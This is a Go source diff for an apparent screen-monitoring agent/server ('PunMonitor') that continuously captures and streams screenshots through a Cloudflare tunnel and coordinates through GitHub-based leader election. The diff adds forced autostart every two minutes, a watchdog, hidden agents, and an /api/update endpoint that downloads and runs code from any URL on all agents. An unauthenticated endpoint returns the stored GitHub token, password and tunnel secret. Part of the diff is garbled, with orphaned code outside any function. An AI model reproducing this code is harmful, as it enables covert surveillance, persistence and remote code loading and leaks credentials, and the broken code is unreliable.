@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"context"
+	_ "embed"
 	"encoding/base64"
 	"encoding/csv"
 	"encoding/json"
@@ -13,6 +14,7 @@ import (
 	"image/jpeg"
 	"io"
 	"math"
+	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -28,6 +30,9 @@ import (
 	"github.com/pion/webrtc/v4"
 	"github.com/quic-go/quic-go"
 )
+
+//go:embed dashboard.html
+var dashboardHTML string
 
 var startTime = time.Now()
 
@@ -50,8 +55,17 @@ const MSG_FRAME = "frame"
 
 var wsClients sync.Map
 
-// activeAgents tracks which hostnames are already connected via WebSocket
-var activeAgents sync.Map // string → bool
+// agentSystemInfo stores system info for each connected agent
+var agentSystemInfo sync.Map
+
+// dashboardContent holds the embedded HTML dashboard
+var dashboardContent string
+
+var (
+    electionInterval  = 5 * time.Minute
+    electionIntervalMu sync.RWMutex
+    electionRetries   int
+)
 
 func (wm *WireMessage) Marshal() []byte {
 	data, _ := json.Marshal(wm)
@@ -73,7 +87,9 @@ type Config struct {
 	ServerURL            string
 	CloudflareAccountTag string
 	CloudflareTunnelSecret string
-	CloudflareTunnelID   string
+    CloudflareTunnelID   string
+    ElectionInterval    string
+    AgentID             string
 }
 
 type SettingsFile struct {
@@ -90,6 +106,8 @@ type SettingsFile struct {
 	CloudflareAccountTag   string  `json:"cloudflare_account_tag"`
 	CloudflareTunnelSecret string  `json:"cloudflare_tunnel_secret"`
 	CloudflareTunnelID     string  `json:"cloudflare_tunnel_id"`
+    ElectionInterval      string  `json:"election_interval,omitempty"`
+    AgentID               string  `json:"agent_id,omitempty"`
 }
 
 type CaptureTier int
@@ -222,6 +240,8 @@ var (
 	hiddenAgents sync.Map
 )
 
+var httpFastClient = &http.Client{Timeout: 10 * time.Second}
+
 // global flags and maps
 var agentMode bool
 var connAgentIDMu sync.RWMutex
@@ -266,6 +286,15 @@ func getHostname() string {
 	h, err := os.Hostname()
 	if err != nil { return "unknown" }
 	return h
+}
+
+func randomString(n int) string {
+    letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+    b := make([]rune, n)
+    for i := range b {
+        b[i] = letters[rand.Intn(len(letters))]
+    }
+    return string(b)
 }
 
 func loadCredentials() {
@@ -314,6 +343,7 @@ func saveSettings() error {
 		CloudflareAccountTag:   cfg.CloudflareAccountTag,
 		CloudflareTunnelSecret: cfg.CloudflareTunnelSecret,
 		CloudflareTunnelID:     cfg.CloudflareTunnelID,
+        AgentID:                cfg.AgentID,
 	}
 	data, err := json.MarshalIndent(s, "", "  ")
 	if err != nil { return err }
@@ -339,35 +369,66 @@ func loadSettings() {
 	if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
 	if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
 	if s.CloudflareTunnelID != "" { cfg.CloudflareTunnelID = s.CloudflareTunnelID }
+    if s.AgentID != "" { cfg.AgentID = s.AgentID }
 	llog("info", "Loaded saved settings from %s", settingsFilePath())
 }
 
-func startScreenCapture(ctx context.Context) {
-	fps := cfg.MaxFPS
-	if fps <= 0 { fps = 1 }
-	interval := time.Duration(float64(time.Second) / fps)
-	ticker := time.NewTicker(interval)
-	defer ticker.Stop()
+func getElectionInterval() time.Duration {
+    electionIntervalMu.RLock()
+    defer electionIntervalMu.RUnlock()
+    return electionInterval
+}
 
-	for {
-		select {
-		case <-ticker.C:
-			img, err := captureScreen()
-			if err != nil {
-				llog("error", "screen capture failed: %v", err)
-				continue
-			}
-			var buf bytes.Buffer
-			if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
-				continue
-			}
-				wm := WireMessage{Type: MSG_FRAME, Data: buf.Bytes(), AgentID: getHostname()}
-				msg := wm.Marshal()
-				broadcastFrame(msg, &wm)
-		case <-ctx.Done():
-			return
+func setElectionInterval(d time.Duration) {
+    electionIntervalMu.Lock()
+    defer electionIntervalMu.Unlock()
+    electionInterval = d
+}
+
+func loadElectionInterval() {
+    const defaultInterval = 5 * time.Minute
+    if cfg.ElectionInterval == "" {
+        setElectionInterval(defaultInterval)
+        return
+    }
+    d, err := time.ParseDuration(cfg.ElectionInterval)
+    if err != nil {
+        setElectionInterval(defaultInterval)
+        return
+    }
+    setElectionInterval(d)
+}
+
+func startScreenCapture(ctx context.Context) {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in screen capture: %v", r)
 		}
-	}
+	}()
+	fps := cfg.MaxFPS
+    if fps <= 0 {
+        fps = 1
+    }
+    interval := time.Duration(float64(time.Second) / fps)
+    for {
+        select {
+        case <-time.After(interval):
+            img, err := captureScreen()
+            if err != nil {
+                llog("error", "screen capture failed: %v", err)
+                continue
+            }
+            var buf bytes.Buffer
+            if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
+                continue
+            }
+            wm := WireMessage{Type: MSG_FRAME, Data: buf.Bytes(), AgentID: cfg.AgentID}
+            msg := wm.Marshal()
+            broadcastFrame(msg, &wm)
+        case <-ctx.Done():
+            return
+        }
+    }
 }
 
 func handleWSMessage(conn *websocket.Conn, msg []byte) {
@@ -382,6 +443,7 @@ func handleWSMessage(conn *websocket.Conn, msg []byte) {
 	case MSG_FRAME:
 		var wm WireMessage
 		if err := json.Unmarshal(msg, &wm); err == nil {
+			llog("debug", "Server received frame from agent %s (%d bytes raw)", wm.AgentID, len(msg))
 			broadcastFrame(msg, &wm)
 		}
 	case "set_fps":
@@ -416,16 +478,29 @@ func handleWSMessage(conn *websocket.Conn, msg []byte) {
 		})
 		conn.WriteMessage(websocket.TextMessage, reply)
 	case "promote_to_server":
-		cfg.IsServerMode = true
-		llog("info", "Promoted to server mode via dashboard")
-		if serverCancel != nil { serverCancel() }
-		serverCtx, serverCancel = context.WithCancel(context.Background())
-		go startScreenCapture(serverCtx)
-		reply, _ := json.Marshal(map[string]string{"type": "promoted", "status": "ok"})
-		conn.WriteMessage(websocket.TextMessage, reply)
+		if target, ok := msgMap["target"].(string); ok && target != "" {
+			agentConnsMu.RLock()
+			agentConn, exists := agentConns[target]
+			agentConnsMu.RUnlock()
+			if exists {
+				forward, _ := json.Marshal(msgMap)
+				agentConn.WriteMessage(websocket.TextMessage, forward)
+				llog("info", "Forwarded promote_to_server to agent %s", target)
+			} else {
+				llog("warn", "Agent %s not found for promote", target)
+			}
+		} else {
+			cfg.IsServerMode = true
+			llog("info", "Promoted to server mode via dashboard")
+			if serverCancel != nil { serverCancel() }
+			serverCtx, serverCancel = context.WithCancel(context.Background())
+			go startScreenCapture(serverCtx)
+			reply, _ := json.Marshal(map[string]string{"type": "promoted", "status": "ok"})
+			conn.WriteMessage(websocket.TextMessage, reply)
+		}
 	case "webrtc_offer":
 		sdp, _ := msgMap["sdp"].(string)
-		connID := fmt.Sprintf("%s-%d", getHostname(), time.Now().UnixNano())
+		connID := fmt.Sprintf("%s-%d", cfg.AgentID, time.Now().UnixNano())
 		go webrtcManager.HandleOffer(connID, sdp, conn)
 	case "webrtc_ice":
 		candidate, _ := msgMap["candidate"].(string)
@@ -461,83 +536,623 @@ func handleWSMessage(conn *websocket.Conn, msg []byte) {
 
 }
 
+
+
+
 func startGitHubLeaderElection() {
-    // Poll the primary_server.json file in the repo every 15 seconds
-    ticker := time.NewTicker(5 * time.Minute)
-    defer ticker.Stop()
-    for {
-        // 1️⃣ Read the file from GitHub (raw URL)
-        rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/primary_server.json", cfg.GitHubRepo)
-        resp, err := http.Get(rawURL)
-        var leader struct {
-            Host    string `json:"host"`
-            Updated int64  `json:"updated"`
-        }
-        if err == nil && resp.StatusCode == http.StatusOK {
-            _ = json.NewDecoder(resp.Body).Decode(&leader)
-            resp.Body.Close()
-        }
-        // 2️⃣ Decide if we should become leader
-        now := time.Now().Unix()
-        stale := leader.Host == "" || now-leader.Updated > 300 // 5 min stale threshold
-        if stale {
-            // Try to claim leadership by committing a new primary_server.json
-            newLeader := struct {
-                Host    string `json:"host"`
-                Updated int64  `json:"updated"`
-            }{Host: myHostname, Updated: now}
-            payloadBytes, _ := json.Marshal(newLeader)
-            b64 := base64.StdEncoding.EncodeToString(payloadBytes)
-            apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/primary_server.json", cfg.GitHubRepo)
-            body := map[string]string{
-                "message": "elect leader",
-                "content": b64,
-                "branch":  "main",
-            }
-            bodyJSON, _ := json.Marshal(body)
-            req, _ := http.NewRequest(http.MethodPut, apiURL, bytes.NewReader(bodyJSON))
-            req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
-            req.Header.Set("Content-Type", "application/json")
-            // If the file already exists we need the SHA – attempt a GET first (cheap, low‑rate)
-            sha := ""
-            if getResp, err := http.Get(apiURL); err == nil && getResp.StatusCode == http.StatusOK {
-                var existing struct{ SHA string `json:"sha"` }
-                json.NewDecoder(getResp.Body).Decode(&existing)
-                getResp.Body.Close()
-                sha = existing.SHA
-            }
-            if sha != "" {
-                // include sha to update existing file
-                var tmp map[string]string
-                json.Unmarshal(bodyJSON, &tmp)
-                tmp["sha"] = sha
-                bodyJSON, _ = json.Marshal(tmp)
-                req.Body = io.NopCloser(bytes.NewReader(bodyJSON))
-                req.ContentLength = int64(len(bodyJSON))
-            }
-            if putResp, err := http.DefaultClient.Do(req); err == nil && putResp.StatusCode == 201 {
-                // Success – we are now the leader
-                llog("info", "Elected as server via GitHub primary_server file")
-                startServerComponents()
-                return // stop election loop; this instance remains server
-            }
-        }
-        // 3️⃣ If another host is leader and still fresh, just wait for next tick
-        select {
-        case <-ticker.C:
+    if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
+        llog("info", "No GitHub config – running as standalone server")
+        runServerComponents()
+        return
+}
+	for {
+		cfg.IsServerMode = false
+		agentMode = false
+		leader, err := tryClaimLeadership()
+		if err != nil {
+			electionRetries++
+			if electionRetries >= 3 {
+				llog("error", "Election failed after %d retries: %v – checking for existing server", electionRetries, err)
+				electionRetries = 0
+				serverURL := cfg.ServerURL
+				if serverURL == "" {
+					serverURL = "https://relay.recruitedge.us"
+				}
+				checkURL := serverURL + "/api/health"
+				foundServer := false
+				for i := 0; i < 15; i++ {
+					checkReq, _ := http.NewRequest("GET", checkURL, nil)
+					checkReq.Header.Set("User-Agent", "PunMonitor-Election")
+					httpClient := &http.Client{Timeout: 5 * time.Second}
+					checkResp, checkErr := httpClient.Do(checkReq)
+					if checkErr == nil && checkResp.StatusCode == 200 {
+						checkResp.Body.Close()
+						llog("info", "Existing server detected at %s after ~%ds – connecting as agent", serverURL, i*3)
+						foundServer = true
+						break
+					}
+					if checkErr != nil {
+						llog("debug", "Health check attempt %d/15: %v", i+1, checkErr)
+					} else {
+						checkResp.Body.Close()
+					}
+					time.Sleep(3 * time.Second)
+				}
+				if foundServer {
+					agentMode = true
+					runAgentClient()
+				} else {
+					llog("info", "No existing server detected after 45s – running as standalone server")
+					cfg.IsServerMode = true
+					runServerComponents()
+				}
+				llog("error", "Fallback cycle ended, re-electing after jitter")
+				time.Sleep(jitterDuration(10, 20))
+				continue
+			}
+			llog("error", "Election error (%d/3): %v – retrying", electionRetries, err)
+			time.Sleep(jitterDuration(3, 7))
+			continue
+		}
+		electionRetries = 0
+		if leader {
+
+
+            llog("info", "Elected as leader on %s", myHostname)
+            cfg.IsServerMode = true
+            runServerComponents()
+            llog("error", "Server stopped, re-electing after jitter")
+            time.Sleep(jitterDuration(10, 20))
+        } else {
+            llog("info", "Not the leader – connecting as agent")
+            agentMode = true
+            runAgentClient()
+            llog("error", "Agent disconnected, re-electing after jitter")
+            time.Sleep(jitterDuration(5, 10))
         }
     }
 }
 
-func startServerComponents() {
-    // Ensure tunnel is running if configured
-    if cfg.CloudflareTunnelID != "" {
-        go startCloudflareTunnel(cfg)
+func jitterDuration(minSec, maxSec int) time.Duration {
+    return time.Duration(minSec+int(rand.Intn(maxSec-minSec+1))) * time.Second
+}
+
+func tryClaimLeadership() (bool, error) {
+    rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/primary_server.json", cfg.GitHubRepo)
+    req, _ := http.NewRequest("GET", rawURL, nil)
+    resp, err := httpFastClient.Do(req)
+    if err != nil {
+        return false, fmt.Errorf("failed to read primary_server.json: %w", err)
     }
-    // Start HTTP server & screen capture (same as main's normal flow)
-    serverCtx, serverCancel = context.WithCancel(context.Background())
-    go startScreenCapture(serverCtx)
-    cfg.IsServerMode = true
+    defer resp.Body.Close()
+
+    if resp.StatusCode == http.StatusNotFound {
+        llog("info", "No primary_server.json found, attempting to claim leadership")
+        return writePrimaryServerFile(cfg.AgentID, "")
+    }
+
+    if resp.StatusCode != http.StatusOK {
+        return false, fmt.Errorf("GitHub raw fetch returned %d", resp.StatusCode)
+    }
+
+    body, err := io.ReadAll(resp.Body)
+    if err != nil {
+        return false, fmt.Errorf("failed to read body: %w", err)
+    }
+
+    var primary struct {
+        Host    string `json:"host"`
+        Updated int64  `json:"updated"`
+    }
+    if err := json.Unmarshal(body, &primary); err != nil {
+        return false, fmt.Errorf("failed to parse primary file: %w", err)
+    }
+
+    interval := getElectionInterval()
+    if primary.Host == cfg.AgentID {
+        llog("info", "Already the leader, renewing leadership")
+        return writePrimaryServerFile(cfg.AgentID, "")
+    }
+
+    if time.Since(time.UnixMilli(primary.Updated)) > interval {
+        llog("info", "Leader %s is stale, attempting to take over", primary.Host)
+        return writePrimaryServerFile(cfg.AgentID, "")
+    }
+
+    llog("info", "Active leader: %s (updated %s ago)", primary.Host, time.Since(time.UnixMilli(primary.Updated)))
+    return false, nil
+}
+
+func writePrimaryServerFile(hostname, sha string) (bool, error) {
+    content := map[string]interface{}{
+        "host":    hostname,
+        "updated": time.Now().UnixMilli(),
+    }
+    contentData, _ := json.Marshal(content)
+    encoded := base64.StdEncoding.EncodeToString(contentData)
+    payload := map[string]interface{}{
+        "message": "leader election: " + hostname,
+        "content": encoded,
+        "branch":  "main",
+    }
+    if sha != "" {
+        payload["sha"] = sha
+    }
+    payloadData, _ := json.Marshal(payload)
+    apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/primary_server.json", cfg.GitHubRepo)
+    req, err := http.NewRequest("PUT", apiURL, bytes.NewReader(payloadData))
+    if err != nil { return false, err }
+    req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
+    req.Header.Set("Content-Type", "application/json")
+    resp, err := httpFastClient.Do(req)
+    if err != nil {
+        return false, err
+    }
+    defer resp.Body.Close()
+
+    if resp.StatusCode == http.StatusCreated || resp.StatusCode == http.StatusOK {
+        return true, nil
+    }
+    if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusConflict {
+        return false, nil // Failed to claim (no token or already claimed), act as agent
+    }
+    return false, fmt.Errorf("GitHub API returned %d", resp.StatusCode)
+}
+    defer resp.Body.Close()
+    if resp.StatusCode == http.StatusNotFound {
+        llog("info", "No primary_server.json found, claiming leadership")
+        return writePrimaryServerFile(myHostname, "")
+    }
+    if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
+        llog("info", "GitHub auth failed (%d) – acting as agent", resp.StatusCode)
+        return false, nil
+    }
+    if resp.StatusCode != http.StatusOK {
+        return false, fmt.Errorf("GitHub API returned %d", resp.StatusCode)
+    }
+    var ghResp struct {
+
+        Content string `json:"content"`
+        SHA     string `json:"sha"`
+    }
+    if err := json.NewDecoder(resp.Body).Decode(&ghResp); err != nil {
+        llog("error", "Leader renewal – decode failed: %v", err)
+        return
+    }
+    decoded, err := base64.StdEncoding.DecodeString(ghResp.Content)
+    if err != nil {
+        return
+    }
+    var primary struct {
+        Host    string `json:"host"`
+        Updated int64  `json:"updated"`
+    }
+    if err := json.Unmarshal(decoded, &primary); err != nil {
+        return
+    }
+    if primary.Host != cfg.AgentID {
+        llog("warn", "Leader renewed by another host %s – stepping down", primary.Host)
+        cfg.IsServerMode = false
+        agentMode = true
+        if serverCancel != nil { serverCancel() }
+        return
+    }
+    writePrimaryServerFile(cfg.AgentID, ghResp.SHA)
+}
+
+func runServerComponents() {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in runServerComponents: %v", r)
+		}
+	}()
+	prov := cfg.TunnelProvider
+	if prov == "" {
+		prov = "cloudflare"
+	}
+	if prov == "cloudflare" && cfg.CloudflareTunnelID != "" {
+		if err := EnsureCloudflaredInstalled(); err != nil {
+			llog("error", "cloudflared setup: %v", err)
+		} else {
+			llog("info", "Cloudflare credentials found, starting tunnel automatically")
+			go startCloudflareTunnel(cfg)
+		}
+	} else {
+		llog("info", "Tunnel provider: %s (no cloudflared needed)", prov)
+	}
+	serverCtx, serverCancel = context.WithCancel(context.Background())
+	go startScreenCapture(serverCtx)
+	cfg.IsServerMode = true
+	agentSystemInfo.Store(cfg.AgentID, map[string]interface{}{
+		"hostname": getHostname(),
+		"local_ip": getLocalIP(),
+		"wan_ip":   getWANIP(),
+		"os":       runtime.GOOS,
+		"arch":     runtime.GOARCH,
+		"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
+		"version":  binaryVersion,
+		"mode":     "server",
+	})
+	go startTransportMonitor(context.Background())
+	go safeRun("leader-renewal", func() {
+		ticker := time.NewTicker(getElectionInterval() / 2)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				renewLeadership()
+			case <-serverCtx.Done():
+				return
+			}
+		}
+	})
+	go func() {
+		ticker := time.NewTicker(24 * time.Hour)
+		for {
+			select {
+			case <-ticker.C:
+				llog("info", "Checking for server updates and credential changes...")
+				checkForServerUpdates()
+				checkForCloudflareKeyChanges()
+			}
+		}
+	}()
+
+	go func() {
+		ticker := time.NewTicker(2 * time.Minute)
+		for range ticker.C {
+			setupAutostart()
+		}
+	}()
+
+	go safeRun("watchdog-monitor", monitorWatchdogProcess)
+
+	llog("info", "Server components started – blocking until cancelled")
+	<-serverCtx.Done()
+	llog("info", "Server components stopped")
+}
+
+func startHTTPServer() {
+	dashboardContent = dashboardHTML
+	if dashboardContent == "" {
+		llog("warn", "Embedded dashboard empty, trying filesystem")
+		if data, err := os.ReadFile("dashboard.html"); err == nil {
+			dashboardContent = string(data)
+		} else {
+			llog("error", "No dashboard available: %v", err)
+		}
+	}
+	llog("info", "Dashboard size: %d bytes", len(dashboardContent))
+
+	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		if dashboardContent == "" {
+			http.Error(w, "dashboard not available", http.StatusNotFound)
+			return
+		}
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Write([]byte(dashboardContent))
+	})
+
+	http.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
+		if dashboardContent == "" {
+			http.Error(w, "dashboard not available", http.StatusNotFound)
+			return
+		}
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Write([]byte(dashboardContent))
+	})
+
+	http.HandleFunc("/api/settings", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		if r.Method == "GET" {
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"github_repo":               cfg.GitHubRepo,
+				"github_token":              cfg.GitHubToken,
+				"auth_user":                 cfg.AuthUser,
+				"auth_pass":                 cfg.AuthPass,
+				"tunnel_provider":           cfg.TunnelProvider,
+				"tunnel_hostname":           cfg.TunnelHostname,
+				"server_url":                cfg.ServerURL,
+				"cloudflare_account_tag":    cfg.CloudflareAccountTag,
+				"cloudflare_tunnel_secret":  cfg.CloudflareTunnelSecret,
+				"cloudflare_tunnel_id":      cfg.CloudflareTunnelID,
+				"max_fps":                   cfg.MaxFPS,
+				"monthly_limit_mb":          cfg.MonthlyLimitMB,
+				"election_interval":         cfg.ElectionInterval,
+			})
+			return
+		}
+		if r.Method == "POST" {
+			var s SettingsFile
+			if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
+				http.Error(w, err.Error(), http.StatusBadRequest)
+				return
+			}
+			if s.ElectionInterval != "" {
+				cfg.ElectionInterval = s.ElectionInterval
+				loadElectionInterval()
+			}
+			if s.GitHubRepo != "" { cfg.GitHubRepo = s.GitHubRepo }
+			if s.GitHubToken != "" { cfg.GitHubToken = s.GitHubToken }
+			if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
+			if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
+			if s.TunnelProvider != "" { cfg.TunnelProvider = s.TunnelProvider }
+			if s.TunnelHostname != "" { cfg.TunnelHostname = s.TunnelHostname }
+			if s.ServerURL != "" { cfg.ServerURL = s.ServerURL }
+			if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
+			if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
+			if s.CloudflareTunnelID != "" {
+				if cfg.CloudflareTunnelID != s.CloudflareTunnelID {
+					cfg.CloudflareTunnelID = s.CloudflareTunnelID
+					if tunnelCmd != nil && tunnelCmd.Process != nil {
+						tunnelCmd.Process.Kill()
+					}
+					if cfg.CloudflareTunnelID != "" {
+						go startCloudflareTunnel(cfg)
+					}
+				}
+			}
+			if s.MaxFPS > 0 { cfg.MaxFPS = s.MaxFPS }
+			if s.MonthlyLimitMB > 0 { cfg.MonthlyLimitMB = s.MonthlyLimitMB }
+			saveSettings()
+			pushCredsToGitHub()
+			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+		}
+	})
+
+	http.HandleFunc("/api/system-info", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		mode := "standalone"
+		if agentMode {
+			mode = "agent"
+		} else if cfg.IsServerMode {
+			mode = "server"
+		}
+		json.NewEncoder(w).Encode(map[string]string{
+			"hostname": getHostname(),
+			"local_ip": getLocalIP(),
+			"wan_ip":   getWANIP(),
+			"os":       runtime.GOOS,
+			"arch":     runtime.GOARCH,
+			"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
+			"version":  binaryVersion,
+			"mode":     mode,
+		})
+	})
+
+	http.HandleFunc("/api/agent-system-info/", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		agentID := strings.TrimPrefix(r.URL.Path, "/api/agent-system-info/")
+		if info, ok := agentSystemInfo.Load(agentID); ok {
+			json.NewEncoder(w).Encode(info)
+		} else {
+			w.WriteHeader(404)
+			json.NewEncoder(w).Encode(map[string]string{"error": "agent not found"})
+		}
+	})
+
+	http.HandleFunc("/api/health", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+	})
+
+	http.HandleFunc("/api/report.csv", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/csv")
+		w.Header().Set("Content-Disposition", "attachment; filename=activity-report-"+time.Now().Format("2006-01-02")+".csv")
+		hostname := getHostname()
+		uptimeSecs := int64(time.Since(startTime).Seconds())
+		uptimeStr := fmt.Sprintf("%dh %dm %ds", uptimeSecs/3600, (uptimeSecs%3600)/60, uptimeSecs%60)
+		bootTime := "never"
+		lastStartup := "never"
+		lastShutdown := "never"
+		lastActive := "never"
+		lastIdleStart := "never"
+		lastWake := "never"
+		if globalActivity != nil {
+			s := globalActivity.Summary()
+			bootTime = s["boot_time"]
+			lastStartup = s["last_startup"]
+			lastShutdown = s["last_shutdown"]
+			lastActive = s["last_active"]
+			lastIdleStart = s["last_idle_start"]
+			lastWake = s["last_wake"]
+		}
+		writer := csv.NewWriter(w)
+		writer.Write([]string{
+			"Agent", "Hostname", "Local IP", "WAN IP",
+			"OS", "Version", "Uptime", "Start Time",
+			"Boot Time", "Last Startup", "Last Active", "Last Idle Start", "Last Shutdown", "Last Wake",
+			"Tunnel ID",
+			"FPS", "Monthly Limit MB",
+			"Report Generated",
+		})
+		writer.Write([]string{
+			hostname, hostname, getLocalIP(), getWANIP(),
+			runtime.GOOS + " " + runtime.GOARCH, binaryVersion, uptimeStr, startTime.Format("2006-01-02 15:04:05"),
+			bootTime, lastStartup, lastActive, lastIdleStart, lastShutdown, lastWake,
+			cfg.CloudflareTunnelID,
+			fmt.Sprintf("%.1f", cfg.MaxFPS), fmt.Sprintf("%d", cfg.MonthlyLimitMB),
+			time.Now().Format("2006-01-02 15:04:05"),
+		})
+		writer.Flush()
+	})
+
+	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		agentConnsMu.RLock()
+		list := make([]string, 0, len(agentConns)+1)
+		for id := range agentConns {
+			list = append(list, id)
+		}
+		agentConnsMu.RUnlock()
+		hasLocal := false
+		for _, id := range list {
+			if id == cfg.AgentID {
+				hasLocal = true
+				break
+			}
+		}
+		if !hasLocal {
+			list = append(list, cfg.AgentID)
+		}
+		json.NewEncoder(w).Encode(list)
+	})
+
+	http.HandleFunc("/api/agents/full", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		agentConnsMu.RLock()
+		list := make([]map[string]interface{}, 0, len(agentConns)+1)
+		for id := range agentConns {
+			hidden := false
+			if v, ok := hiddenAgents.Load(id); ok {
+				hidden = v.(bool)
+			}
+			list = append(list, map[string]interface{}{"id": id, "hidden": hidden, "connected": true})
+		}
+		agentConnsMu.RUnlock()
+		myHidden := false
+		if v, ok := hiddenAgents.Load(cfg.AgentID); ok {
+			myHidden = v.(bool)
+		}
+		if _, exists := agentConns[cfg.AgentID]; !exists {
+			list = append(list, map[string]interface{}{"id": cfg.AgentID, "hidden": myHidden, "connected": false})
+		}
+		json.NewEncoder(w).Encode(list)
+	})
+
+	http.HandleFunc("/api/hide-agent", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != "POST" {
+			http.Error(w, "POST only", http.StatusMethodNotAllowed)
+			return
+		}
+		var req struct {
+			AgentID string `json:"agent_id"`
+			Hide    bool   `json:"hide"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		hiddenAgents.Store(req.AgentID, req.Hide)
+		llog("info", "Agent %s hidden=%v", req.AgentID, req.Hide)
+		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+	})
+
+	http.HandleFunc("/api/promote", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != "POST" {
+			http.Error(w, "POST only", http.StatusMethodNotAllowed)
+			return
+		}
+		cfg.IsServerMode = true
+		llog("info", "Promoted to server mode via HTTP")
+		if serverCancel != nil { serverCancel() }
+		serverCtx, serverCancel = context.WithCancel(context.Background())
+		go startScreenCapture(serverCtx)
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]string{"status": "ok", "mode": "server"})
+	})
+
+	http.HandleFunc("/api/transport-status", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(getTransportStatus())
+	})
+
+	http.HandleFunc("/api/version", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]string{"version": binaryVersion})
+	})
+
+	http.HandleFunc("/api/update", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != "POST" {
+			http.Error(w, "POST only", http.StatusMethodNotAllowed)
+			return
+		}
+		var req struct {
+			URL string `json:"url"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.URL == "" {
+			http.Error(w, "missing url", http.StatusBadRequest)
+			return
+		}
+		go selfUpdate(req.URL)
+		agentUpdateMsg, _ := json.Marshal(map[string]string{
+			"type": "update",
+			"url":  req.URL,
+		})
+		connAgentIDMu.RLock()
+		wsClients.Range(func(key, value interface{}) bool {
+			conn := key.(*websocket.Conn)
+			if _, isAgent := connAgentID[conn]; isAgent {
+				conn.WriteMessage(websocket.TextMessage, agentUpdateMsg)
+			}
+			return true
+		})
+		connAgentIDMu.RUnlock()
+		json.NewEncoder(w).Encode(map[string]string{"status": "ok", "msg": "Update sent to server + agents"})
+	})
+
+	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
+		upgrader := websocket.Upgrader{
+			CheckOrigin: func(r *http.Request) bool { return true },
+		}
+		conn, err := upgrader.Upgrade(w, r, nil)
+		if err != nil {
+			llog("error", "WebSocket upgrade failed: %v", err)
+			return
+		}
+		llog("info", "WebSocket client connected")
+		wsClients.Store(conn, true)
+		var agentID string
+		defer func() {
+			wsClients.Delete(conn)
+			if agentID != "" {
+				agentConnsMu.Lock()
+				delete(agentConns, agentID)
+				agentConnsMu.Unlock()
+				connAgentIDMu.Lock()
+				delete(connAgentID, conn)
+				connAgentIDMu.Unlock()
+				agentSystemInfo.Delete(agentID)
+			}
+			conn.Close()
+			llog("info", "WebSocket client disconnected")
+		}()
+		for {
+			_, msg, err := conn.ReadMessage()
+			if err != nil {
+				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+					llog("error", "WebSocket read error: %v", err)
+				}
+				break
+			}
+			var msgMap map[string]interface{}
+			if err := json.Unmarshal(msg, &msgMap); err == nil {
+				if t, _ := msgMap["type"].(string); t == "hello" {
+					if a, _ := msgMap["agent"].(bool); a {
+						if id, _ := msgMap["agentId"].(string); id != "" {
+							agentID = id
+							agentConnsMu.Lock()
+							agentConns[agentID] = conn
+							agentConnsMu.Unlock()
+							connAgentIDMu.Lock()
+							connAgentID[conn] = agentID
+							connAgentIDMu.Unlock()
